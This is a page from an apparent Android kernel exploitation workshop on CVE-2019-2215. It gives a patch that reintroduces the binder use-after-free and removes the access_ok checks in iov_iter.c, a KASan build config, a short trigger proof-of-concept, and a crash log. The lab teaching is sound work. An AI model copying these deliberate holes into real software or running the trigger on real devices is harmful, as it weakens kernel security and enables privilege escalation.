
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Vulnerability Trigger Â· Android Kernel Exploitation</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Ashfaq Ansari (@HackSysTeam)">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="vulnerability-trigger.html" />
    
    
    <link rel="prev" href="vulnerability-discovery.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html">
            
                    
                    Environment Setup
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="environment-setup.html">
            
                <a href="environment-setup.html#hardware-requirements">
            
                    
                    Hardware Requirements
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html#software-requirements">
            
                    
                    Software Requirements
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.2.1" data-path="environment-setup.html">
            
                <a href="environment-setup.html#gdb">
            
                    
                    GDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html#workshop-repository">
            
                    
                    Workshop Repository
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.3" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-studio">
            
                    
                    Android Studio
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.4" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-ndk">
            
                    
                    Android NDK
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.5" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-virtual-device">
            
                    
                    Android Virtual Device
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.6" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-kernel-source-code">
            
                    
                    Android Kernel Source Code
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html">
            
                    
                    Linux Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#light-weight-process">
            
                    
                    Light Weight Process
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#process-credentials">
            
                    
                    Process Credentials
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#selinux">
            
                    
                    SELinux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.3.1" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#selinux-enforcing">
            
                    
                    selinux_enforcing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#seccomp">
            
                    
                    SecComp
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html">
            
                    
                    Vulnerability Discovery
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#original-discovery">
            
                    
                    Original Discovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#rediscovery">
            
                    
                    Rediscovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#patch">
            
                    
                    Patch
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter active" data-level="1.5" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html">
            
                    
                    Vulnerability Trigger
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#reintroduction">
            
                    
                    Reintroduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#build-kernel-with-kasan">
            
                    
                    Build Kernel With KASan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#boot-kernel">
            
                    
                    Boot Kernel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#crash">
            
                    
                    Crash
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#kasan-symbolizer">
            
                    
                    KASan Symbolizer
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="scripted-privilege-escalation.html">
            
                <a href="scripted-privilege-escalation.html">
            
                    
                    Scripted Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="scripted-privilege-escalation.html">
            
                <a href="scripted-privilege-escalation.html#kernel-debugging">
            
                    
                    Kernel Debugging
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html">
            
                    
                    Root Cause Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash">
            
                    
                    Revisiting Crash
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-allocation">
            
                    
                    Allocation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-free">
            
                    
                    Free
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-use">
            
                    
                    Use
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#visual-studio-code">
            
                    
                    Visual Studio Code
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#static-analysis">
            
                    
                    Static Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.3.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-open">
            
                    
                    open
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-epoll-create">
            
                    
                    epoll_create
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-epoll-ctl">
            
                    
                    epoll_ctl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.4" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-ioctl">
            
                    
                    ioctl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.5" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-ep-remove">
            
                    
                    ep_remove
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.6" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#static-analysis-recap">
            
                    
                    Static Analysis Recap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#dynamic-analysis">
            
                    
                    Dynamic Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.4.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#hw-cpu-ncore">
            
                    
                    hw.cpu.ncore
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#build-kernel-without-kasan">
            
                    
                    Build Kernel Without KASan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#kernel-tracing">
            
                    
                    Kernel Tracing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="exploitation.html">
            
                <a href="exploitation.html">
            
                    
                    Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="exploitation.html">
            
                <a href="exploitation.html#primitive">
            
                    
                    Primitive
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="exploitation.html">
            
                <a href="exploitation.html#corruption-target">
            
                    
                    Corruption Target
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="exploitation.html">
            
                <a href="exploitation.html#leaking-task-struct-pointer">
            
                    
                    Leaking task_struct*
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.4" data-path="exploitation.html">
            
                <a href="exploitation.html#clobber-addr-limit">
            
                    
                    Clobber addr_limit
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.5" data-path="exploitation.html">
            
                <a href="exploitation.html#exploit-in-action">
            
                    
                    Exploit In Action
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="gdb-macros.html">
            
                <a href="gdb-macros.html">
            
                    
                    GDB Macros
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="resources.html">
            
                <a href="resources.html">
            
                    
                    Resources
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Vulnerability Trigger</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="vulnerability-trigger">Vulnerability Trigger</h1>
<p>In <strong><a href="environment-setup.html#android-kernel-source-code">Android Kernel Source Code</a></strong> section, we <em>synchronized</em> <code>q-goldfish-android-goldfish-4.14-dev</code> branch. However, <code>CVE-2019-2215</code> is already patched in <code>q-goldfish-android-goldfish-4.14-dev</code>.</p>
<p>We will <strong>reintroduce</strong> the <strong>vulnerability</strong> by applying a custom <em>patch</em> and then build it with <strong>Kernel Address Sanitizer (KASan)</strong> support.</p>
<h2 id="reintroduction">Reintroduction </h2>
<p>You can find the custom <em>patch</em> in the <code>workshop/patch</code> directory which will <strong>reintroduce</strong> the vulnerability again.</p>
<pre class="language-"><code class="lang-diff">diff --git a/drivers/android/binder.c b/drivers/android/binder.c
index f6ddec245187..55e2748a13e4 100644
<span class="token coord">--- a/drivers/android/binder.c</span>
<span class="token coord">+++ b/drivers/android/binder.c</span>
@@ -4768,10 +4768,12 @@ static int binder_thread_release(struct binder_proc *proc,
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * waitqueue_active() is safe to use here because we&apos;re holding
</span><span class="token prefix unchanged"> </span><span class="token line">     * the inner lock.
</span><span class="token prefix unchanged"> </span><span class="token line">     */
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /*
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if ((thread-&gt;looper &amp; BINDER_LOOPER_STATE_POLL) &amp;&amp;
</span><span class="token prefix unchanged"> </span><span class="token line">        waitqueue_active(&amp;thread-&gt;wait)) {
</span><span class="token prefix unchanged"> </span><span class="token line">        wake_up_poll(&amp;thread-&gt;wait, POLLHUP | POLLFREE);
</span><span class="token prefix unchanged"> </span><span class="token line">    }
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    */
</span></span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    binder_inner_proc_unlock(thread-&gt;proc);
</span></span>
@@ -4781,8 +4783,10 @@ static int binder_thread_release(struct binder_proc *proc,
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * descriptor being closed); ep_remove_waitqueue() holds an RCU read
</span><span class="token prefix unchanged"> </span><span class="token line">     * lock, so we can be sure it&apos;s done after calling synchronize_rcu().
</span><span class="token prefix unchanged"> </span><span class="token line">     */
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /*
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (thread-&gt;looper &amp; BINDER_LOOPER_STATE_POLL)
</span><span class="token prefix unchanged"> </span><span class="token line">        synchronize_rcu();
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    */
</span></span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (send_reply)
</span><span class="token prefix unchanged"> </span><span class="token line">        binder_send_failed_reply(send_reply, BR_DEAD_REPLY);
</span></span>diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index 7b2fd5f251f2..67af61637f55 100644
<span class="token coord">--- a/lib/iov_iter.c</span>
<span class="token coord">+++ b/lib/iov_iter.c</span>
<span class="token coord">@@ -132,19 +132,21 @@</span>

<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">static int copyout(void __user *to, const void *from, size_t n)
</span><span class="token prefix unchanged"> </span><span class="token line">{
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if (access_ok(VERIFY_WRITE, to, n)) {
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /*if (access_ok(VERIFY_WRITE, to, n)) {
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        kasan_check_read(from, n);
</span><span class="token prefix unchanged"> </span><span class="token line">        n = raw_copy_to_user(to, from, n);
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    }
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    }*/
</span><span class="token prefix inserted">+</span><span class="token line">    n = raw_copy_to_user(to, from, n);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return n;
</span><span class="token prefix unchanged"> </span><span class="token line">}
</span></span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">static int copyin(void *to, const void __user *from, size_t n)
</span><span class="token prefix unchanged"> </span><span class="token line">{
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if (access_ok(VERIFY_READ, from, n)) {
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /*if (access_ok(VERIFY_READ, from, n)) {
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        kasan_check_write(to, n);
</span><span class="token prefix unchanged"> </span><span class="token line">        n = raw_copy_from_user(to, from, n);
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    }
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    }*/
</span><span class="token prefix inserted">+</span><span class="token line">    n = raw_copy_from_user(to, from, n);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return n;
</span><span class="token prefix unchanged"> </span><span class="token line">}
</span></span></code></pre>
<p>Let&apos;s apply the <em>patch</em> and see which files are modified.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop/android-4.14-dev$ <span class="token builtin class-name">cd</span> goldfish/
ashfaq@hacksys:~/workshop/android-4.14-dev/goldfish$ <span class="token function">git</span> status
Not currently on any branch.
nothing to commit, working tree clean
ashfaq@hacksys:~/workshop/android-4.14-dev/goldfish$ <span class="token function">git</span> apply ~/workshop/patch/cve-2019-2215.patch
ashfaq@hacksys:~/workshop/android-4.14-dev/goldfish$ <span class="token function">git</span> status
Not currently on any branch.
Changes not staged <span class="token keyword">for</span> commit:
  <span class="token punctuation">(</span>use <span class="token string">&quot;git add &lt;file&gt;...&quot;</span> to update what will be committed<span class="token punctuation">)</span>
  <span class="token punctuation">(</span>use <span class="token string">&quot;git checkout -- &lt;file&gt;...&quot;</span> to discard changes <span class="token keyword">in</span> working directory<span class="token punctuation">)</span>

    modified:   drivers/android/binder.c
    modified:   lib/iov_iter.c

no changes added to commit <span class="token punctuation">(</span>use <span class="token string">&quot;git add&quot;</span> and/or <span class="token string">&quot;git commit -a&quot;</span><span class="token punctuation">)</span>
</code></pre>
<p>Patching <code>drivers/android/binder.c</code> is fine and understandable. But, why we need to <em>patch</em> <code>lib/iov_iter.c</code>?</p>
<p>This is because we are also going to use <code>struct iovec</code> as the corruption target as used by <strong>Maddie Stone</strong> and <strong>Jann Horn</strong> of <strong>Project Zero</strong>. However, they wrote the exploit for <strong>Android 4.4</strong> kernel which does not have these <strong>additional checks</strong> in <code>lib/iov_iter.c</code>. </p>
<p>That&apos;s the reason we revert these new checks with a <em>patch</em>. You will have better idea what I&apos;m talking about as we proceed with the workshop.</p>
<h2 id="build-kernel-with-kasan">Build Kernel With KASan </h2>
<p>To build the kernel with <strong>KASan</strong> support we will need a configuration file. You will find the config file in <code>workshop/build-configs/goldfish.x86_64.kasan</code> directory.</p>
<pre class="language-"><code class="lang-bash"><span class="token assign-left variable">ARCH</span><span class="token operator">=</span>x86_64
<span class="token assign-left variable">BRANCH</span><span class="token operator">=</span>kasan

<span class="token assign-left variable">CC</span><span class="token operator">=</span>clang
<span class="token assign-left variable">CLANG_PREBUILT_BIN</span><span class="token operator">=</span>prebuilts-master/clang/host/linux-x86/clang-r377782b/bin
<span class="token assign-left variable">BUILDTOOLS_PREBUILT_BIN</span><span class="token operator">=</span>build/build-tools/path/linux-x86
<span class="token assign-left variable">CLANG_TRIPLE</span><span class="token operator">=</span>x86_64-linux-gnu-
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>x86_64-linux-androidkernel-
<span class="token assign-left variable">LINUX_GCC_CROSS_COMPILE_PREBUILTS_BIN</span><span class="token operator">=</span>prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.9/bin

<span class="token assign-left variable">KERNEL_DIR</span><span class="token operator">=</span>goldfish
<span class="token assign-left variable">EXTRA_CMDS</span><span class="token operator">=</span><span class="token string">&apos;&apos;</span>
<span class="token assign-left variable">STOP_SHIP_TRACEPRINTK</span><span class="token operator">=</span><span class="token number">1</span>

<span class="token assign-left variable">FILES</span><span class="token operator">=</span><span class="token string">&quot;
arch/x86/boot/bzImage
vmlinux
System.map
&quot;</span>

<span class="token assign-left variable">DEFCONFIG</span><span class="token operator">=</span>x86_64_ranchu_defconfig
<span class="token assign-left variable">POST_DEFCONFIG_CMDS</span><span class="token operator">=</span><span class="token string">&quot;check_defconfig &amp;&amp; update_kasan_config&quot;</span>

<span class="token keyword">function</span> <span class="token function-name function">update_kasan_config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">${KERNEL_DIR}</span>/scripts/config --file <span class="token variable">${OUT_DIR}</span>/.config <span class="token punctuation">\</span>
         -e CONFIG_KASAN <span class="token punctuation">\</span>
         -e CONFIG_KASAN_INLINE <span class="token punctuation">\</span>
         -e CONFIG_TEST_KASAN <span class="token punctuation">\</span>
         -e CONFIG_KCOV <span class="token punctuation">\</span>
         -e CONFIG_SLUB <span class="token punctuation">\</span>
         -e CONFIG_SLUB_DEBUG <span class="token punctuation">\</span>
         -e CONFIG_SLUB_DEBUG_ON <span class="token punctuation">\</span>
         -d CONFIG_SLUB_DEBUG_PANIC_ON <span class="token punctuation">\</span>
         -d CONFIG_KASAN_OUTLINE <span class="token punctuation">\</span>
         -d CONFIG_KERNEL_LZ4 <span class="token punctuation">\</span>
         -d CONFIG_RANDOMIZE_BASE
    <span class="token punctuation">(</span>cd <span class="token variable">${OUT_DIR}</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
     <span class="token function">make</span> <span class="token assign-left variable">O</span><span class="token operator">=</span><span class="token variable">${OUT_DIR}</span> <span class="token variable">$archsubarch</span> <span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span><span class="token variable">${CROSS_COMPILE}</span> olddefconfig<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Now, let&apos;s use this config file and start the build process.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop/android-4.14-dev$ <span class="token assign-left variable">BUILD_CONFIG</span><span class="token operator">=</span><span class="token punctuation">..</span>/build-configs/goldfish.x86_64.kasan build/build.sh
</code></pre>
<p>You can find the built kernel and other files in <code>workshop/android-4.14-dev/out/kasan/dist</code>.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop/android-4.14-dev$ nm out/kasan/dist/vmlinux <span class="token operator">|</span> <span class="token function">grep</span> kasan <span class="token operator">|</span> <span class="token function">head</span> 
000000004cfd027e A __crc_kasan_check_read
000000009da7c655 A __crc_kasan_check_write
0000000074961168 A __crc_kasan_kmalloc
0000000047f78877 A __crc_kasan_restore_multi_shot
0000000097645739 A __crc_kasan_save_enable_multi_shot
ffffffff806d4d62 T kasan_add_zero_shadow
ffffffff806d3a9c T kasan_alloc_pages
ffffffff806d3b44 T kasan_cache_create
ffffffff806d55b9 T kasan_cache_shrink
ffffffff806d55c4 T kasan_cache_shutdown
</code></pre>
<h2 id="boot-kernel">Boot Kernel </h2>
<p>Let&apos;s boot this custom kernel in <strong>emulator</strong>.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop/android-4.14-dev$ emulator -show-kernel -no-snapshot -wipe-data -avd CVE-2019-2215 -kernel ~/workshop/android-4.14-dev/out/kasan/dist/bzImage
</code></pre>
<blockquote>
<p><strong>Note:</strong> <code>-show-kernel</code> flag is used to display kernel debug messages in the terminal window. Read more about emulator command line flags here <a href="https://developer.android.com/studio/run/emulator-commandline" target="_blank">https://developer.android.com/studio/run/emulator-commandline</a></p>
</blockquote>
<p>If you look at kernel log being displayed in the terminal window after running the above command, you will notice this</p>
<pre class="language-"><code>[    0.000000] kasan: KernelAddressSanitizer initialized
</code></pre><p>This is an indicator that we are able to successfully boot a custom kernel built with <strong>KASan</strong> support.</p>
<h2 id="crash">Crash </h2>
<p>Let&apos;s grab the PoC from the original bug report and see if we are able to trigger the vulnerability and produce a <strong>KASan</strong> crash.</p>
<p>You can find the trigger PoC in <code>workshop/exploit/trigger.cpp</code>. I have provided a <code>Makefile</code> that you can use to build the PoC and push it to the <strong>virtual device</strong>.</p>
<pre class="language-"><code class="lang-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/epoll.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BINDER_THREAD_EXIT <span class="token number">0x40046208ul</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> epfd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">epoll_event</span> event <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span>events <span class="token operator">=</span> EPOLLIN<span class="token punctuation">}</span><span class="token punctuation">;</span>

    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/dev/binder&quot;</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    epfd <span class="token operator">=</span> <span class="token function">epoll_create</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">epoll_ctl</span><span class="token punctuation">(</span>epfd<span class="token punctuation">,</span> EPOLL_CTL_ADD<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> BINDER_THREAD_EXIT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop$ <span class="token builtin class-name">cd</span> exploit/
ashfaq@hacksys:~/workshop/exploit$ <span class="token assign-left variable">NDK_ROOT</span><span class="token operator">=</span>~/Android/Sdk/ndk/21.0.6113669 <span class="token function">make</span> build-trigger push-trigger
Building: cve-2019-2215-trigger
Pushing: cve-2019-2215-trigger to /data/local/tmp
cve-2019-2215-trigger: <span class="token number">1</span> <span class="token function">file</span> pushed, <span class="token number">0</span> skipped. <span class="token number">44.8</span> MB/s <span class="token punctuation">(</span><span class="token number">3958288</span> bytes <span class="token keyword">in</span> <span class="token number">0</span>.084s<span class="token punctuation">)</span>
</code></pre>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop/exploit$ adb shell
generic_x86_64:/ $ <span class="token function">uname</span> -a
Linux localhost <span class="token number">4.14</span>.150+ <span class="token comment">#1 repo:q-goldfish-android-goldfish-4.14-dev SMP PREEMPT Sat Apr x86_64</span>
generic_x86_64:/ $ <span class="token builtin class-name">cd</span> /data/local/tmp
generic_x86_64:/data/local/tmp $ ./cve-2019-2215-trigger
generic_x86_64:/data/local/tmp $
</code></pre>
<p>Look at the terminal window from where you launched the <strong>emulator</strong>, you will see the <strong>KASan</strong> crash log.</p>
<pre class="language-"><code>[  382.398561] ==================================================================
[  382.402796] BUG: KASAN: use-after-free in _raw_spin_lock_irqsave+0x3a/0x5d
[  382.405929] Write of size 4 at addr ffff88804e4865c8 by task cve-2019-2215-t/7682
[  382.409386] 
[  382.410127] CPU: 1 PID: 7682 Comm: cve-2019-2215-t Tainted: G        W       4.14.150+ #1
[  382.413871] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.1-0-g0551a4be2c-prebuilt.qemu-project.org 04/01/2014
[  382.417931] Call Trace:
[  382.419106]  dump_stack+0x78/0xbe
[  382.420596]  print_address_description+0x81/0x25d
[  382.422146]  ? _raw_spin_lock_irqsave+0x3a/0x5d
[  382.423691]  __kasan_report+0x14f/0x180
[  382.425082]  ? _raw_spin_lock_irqsave+0x3a/0x5d
[  382.426437]  kasan_report+0x26/0x49
[  382.427468]  check_memory_region+0x171/0x17e
[  382.428725]  kasan_check_write+0x14/0x16
[  382.429884]  _raw_spin_lock_irqsave+0x3a/0x5d
[  382.431010]  remove_wait_queue+0x27/0x122
[  382.432003]  ? fsnotify_unmount_inodes+0x1e8/0x1e8
[  382.433156]  ep_unregister_pollwait+0x160/0x1bd
[  382.434252]  ep_free+0x8b/0x181
[  382.435024]  ? ep_eventpoll_poll+0x228/0x228
[  382.435953]  ep_eventpoll_release+0x48/0x54
